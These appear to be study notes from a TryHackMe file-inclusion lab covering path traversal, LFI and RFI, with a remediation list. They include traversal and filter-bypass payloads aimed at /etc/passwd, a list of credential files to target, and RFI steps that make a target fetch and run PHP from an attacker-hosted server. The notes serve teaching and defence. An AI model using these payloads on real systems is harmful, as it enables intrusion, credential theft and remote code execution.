

### What is File Inclusion?

In some scenarios, web applications are written to request access to files on a given system, including images, static text, and so on via parameters. Parameters are query parameter strings attached to the URL that could be used to retrieve data or perform actions based on user input.


![[fileInclusion.png]]

Example : parameters are used with Google searching, where GET requests pass user input into the search engine. https://www.google.com/search?q=TryHackMe

Let's discuss a scenario where a user requests to access files from a webserver. First, the user sends an HTTP request to the webserver that includes a file to display. For example, if a user wants to access and display their CV within the web application, the request may look as follows, http://webapp.thm/get.php?file=userCV.pdf, where the file is the parameter and the userCV.pdf, is the required file to access.


![[fileInclusion2.png]]


File inclusion vulnerabilities are commonly found and exploited in various programming languages for web applications, such as PHP that are poorly written and implemented. The main issue of these vulnerabilities is the input validation, in which the user inputs are not sanitized or validated, and the user controls them. When the input is not validated, the user can pass any input to the function, causing the vulnerability.

### What is the risk of File inclusion?

By default, an attacker can leverage file inclusion vulnerabilities to leak data, such as code, credentials or other important files related to the web application or operating system. Moreover, if the attacker can write files to the server by any other means, file inclusion might be used in tandem to gain remote command execution (RCE).


### Path Traversal / Directory Traversal

Directory traversal, a web security vulnerability allows an attacker to read operating system resources, such as local files on the server running an application. 
***The attacker exploits this vulnerability by manipulating and abusing the web application's URL to locate and access files or directories stored outside the application's root directory.***

***Path traversal vulnerabilities occur when the user's input is passed to a function such as file_get_contents in PHP.*** It's important to note that the function is not the main contributor to the vulnerability. Often poor input validation or filtering is the cause of the vulnerability. In PHP, you can use the file_get_contents to read the content of a file


![[directoryTraversal.png]]


We can test out the URL parameter by adding payloads to see how the web application behaves. Path traversal attacks, also known as the dot-dot-slash attack, take advantage of moving the directory one step up using the double dots ../. If the attacker finds the entry point, which in this case get.php?file=, then the attacker may send something as follows, http://webapp.thm/get.php?file=../../../../etc/passwd


![[directoryTraversalResult.png]]


Similarly, if the web application runs on a Windows server, the attacker needs to provide Windows paths. For example, if the attacker wants to read the boot.ini file located in c:\boot.ini, then the attacker can try the following depending on the target OS version:

\http://webapp.thm/get.php?file=../../../../boot.ini or

\http://webapp.thm/get.php?file=../../../../windows/win.ini



|   |   |
|---|---|
|**Location**|**Description**|
|/etc/issue|contains a message or system identification to be printed before the login prompt.|
|/etc/profile|controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived|
|/proc/version|specifies the version of the Linux kernel|
|/etc/passwd|has all registered user that has access to a system|
|/etc/shadow|contains information about the system's users' passwords|
|/root/.bash_history|contains the history commands for root user|
|/var/log/dmessage|contains global system messages, including the messages that are logged during system startup|
|/var/mail/root|all emails for root user|
|/root/.ssh/id_rsa|Private SSH keys for a root or any known valid user on the server|
|/var/log/apache2/access.log|the accessed requests for Apache  webserver|
|C:\boot.ini|contains the boot options for computers with BIOS firmware|


---

### LFI(Local File Inclusion)

LFI attacks against web applications are often due to a developers' lack of security awareness. ***With PHP, using functions such as include, require, include_once, and require_once often contribute to vulnerable web applications***
LFI vulnerabilities also occur when using other languages such as ASP, JSP, or even in Node.js apps. LFI exploits follow the same concepts as path traversal.

Example 1 : Suppose the web application provides two languages, and the user can select between the EN and AR

```php
<?PHP 
	include($_GET["lang"]);
?>
```

The PHP code above uses a GET request via the URL parameter lang to include the file of the page. The call can be done by sending the following HTTP request as follows: http://webapp.thm/index.php?lang=EN.php to load the English page or http://webapp.thm/index.php?lang=AR.php to load the Arabic page, where EN.php and AR.php files exist in the same directory.

Theoretically, we can access and display any readable file on the server from the code above if there isn't any input validation. Let's say we want to read the /etc/passwd file, which contains sensitive information about the users of the Linux operating system, we can try the following: http://webapp.thm/get.php?file=/etc/passwd 
In this case, it works because there isn't a directory specified in the include function and no input validation.


Example 2 : Next, In the following code, the developer decided to specify the directory inside the function.

```php
<?PHP 
	include("languages/". $_GET['lang']); 
?>
```

. used for concatenation in PHP

In the above code, the developer decided to use the include function to call PHP pages in the languages directory only via lang parameters.

If there is no input validation, the attacker can manipulate the URL by replacing the lang input with other OS-sensitive files such as /etc/passwd.

Again the payload looks similar to the path traversal, but the include function allows us to include any called files into the current page. The following will be the exploit:

\http://webapp.thm/index.php?lang=../../../../etc/passwd



Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.  

By adding the Null Byte at the end of the payload, we tell the  include function to ignore anything after the null byte which may look like:

include("languages/../../../../../etc/passwd%00").".php"); which equivalent to → include("languages/../../../../../etc/passwd");

**the %00 trick is fixed and not working with PHP 5.3.4 and above.**

Example :  Input : ../../../../etc/passwd 
Output : Failed opening 'includes/../../../../etc/passwd.php'

It is adding .php at the end

Input : ../../../../../etc/passwd%00
OR
../../../../../etc/passwd0x00


Example : 
the developer decided to filter keywords to avoid disclosing sensitive information! The /etc/passwd file is being filtered. There are two possible methods to bypass the filter. First, by using the NullByte %00 or the current directory trick at the end of the filtered keyword /.. The exploit will be similar to http://webapp.thm/index.php?lang=/etc/passwd/. We could also use http://webapp.thm/index.php?lang=/etc/passwd%00.

***To make it clearer, if we try this concept in the file system using cd .., it will get you back one step; however, if you do cd ., It stays in the current directory.  Similarly, if we try  /etc/passwd/.., it results to be  /etc/ and that's because we moved one to the root.  Now if we try  /etc/passwd/., the result will be  /etc/passwd since dot refers to the current directory.***


Example :  Next, in the following scenarios, the developer starts to use input validation by filtering some keywords. Let's test out and check the error message!  

\http://webapp.thm/index.php?lang=../../../../etc/passwd  

We got the following error!  

```php
Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15
```


***If we check the warning message in the include(languages/etc/passwd) section, we know that the web application replaces the ../ with the empty string. There are a couple of techniques we can use to bypass this.
First, we can send the following payload to bypass it: ....//....//....//....//....//etc/passwd***

Why did this work?

This works because the PHP filter only matches and replaces the first subset string ../ it finds and doesn't do another pass

![[directoryTraversalDouble.png]]

case where the developer forces the include to read from a defined directory! For example, if the web application asks to supply input that has to include a directory such as: http://webapp.thm/index.php?lang=languages/EN.php then, to exploit this, we need to include the directory in the payload like so: ?lang=languages/../../../../../etc/passwd.

---

### RFI(Remote File Inclusion)

Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application. ***Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. One requirement for RFI is that the allow_url_fopen option needs to be on.***

The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:

- Sensitive Information Disclosure
- Cross-site Scripting (XSS)
- Denial of Service (DoS)

An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.

![[RFI.png]]


The following figure is an example of steps for a successful RFI attack! Let's say that the attacker hosts a PHP file on their own server \http://attacker.thm/cmd.txt where cmd.txt contains a printing message  Hello THM.

```php
<?PHP echo "Hello THM"; ?>
```

First, the attacker injects the malicious URL, which points to the attacker's server, such as http://webapp.thm/index.php?lang=\http://attacker.thm/cmd.txt. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the Hello THM message.


##### Remediation

As a developer, it's important to be aware of web application vulnerabilities, how to find them, and prevention methods. To prevent the file inclusion vulnerabilities, some common suggestions include:

  

1. Keep system and services, including web application frameworks, updated with the latest version.  
    
2. Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
3. A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
4. Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow_url_fopen on and allow_url_include.  
    
5. Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
6. Never trust user input, and make sure to implement proper input validation against file inclusion.  
    
7. Implement whitelisting for file names and locations as well as blacklisting.


**Change method from GET to POST**
**....//....//....//....//....//....//....//etc//passwd**
**Try to input it into URL with URL encoding it**

For RFI
Start a python server
Create a file in that same directory
Call it host.txt

```php
<?php
print exec('hostname');
?>

```


in URL

\http://10.10.122.243/playground.php?file=\http://10.8.151.132:80/host.txt

add the url of file after the file query parameter
Dont forget to add the port number of server running
10.8.151.132:80  - this is our URL 
our http server running on port 80